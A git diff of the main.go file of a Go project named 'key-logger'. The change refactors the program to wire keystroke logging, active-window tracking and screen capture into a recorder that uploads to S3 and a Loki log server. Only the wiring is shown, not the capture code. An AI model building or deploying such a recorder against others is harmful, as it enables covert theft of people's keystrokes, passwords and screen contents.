@@ -8,9 +8,11 @@ import (
 	"github.com/go-kit/log/level"
 	"github.com/grafana/loki-client-go/loki"
 
-	"key-logger/pkg/key"
+	"key-logger/pkg/activewindow"
+	"key-logger/pkg/keylogger"
+	"key-logger/pkg/recorder"
 	s32 "key-logger/pkg/s3"
-	"key-logger/pkg/window"
+	"key-logger/pkg/screencap"
 )
 
 func main() {
@@ -35,18 +37,16 @@ func main() {
 
 	s3 := s32.New(*endpoint, *accessKeyId, *secretKey, *bucketName)
 
-	w := window.New(logger, s3, lokiClient)
-	_ = key.New(logger, w)
+	kl := keylogger.New()
+	wt := activewindow.New()
+	cap := screencap.New()
 
-	for {
-		select {}
+	rec := recorder.New(logger, kl, wt, cap, s3, lokiClient)
+	if err := rec.Start(); err != nil {
+		level.Error(logger).Log("msg", "error starting recorder", "err", err)
+		os.Exit(1)
 	}
 
-	//go getActiveWindowInfo(winChan, processChan)
-	//
-	//
-	//
-	//go cb.updateActiveWindow(winChan, processChan)
-	//go getLastInputInfoLoop()
-
+	// Block forever.
+	select {}
 }
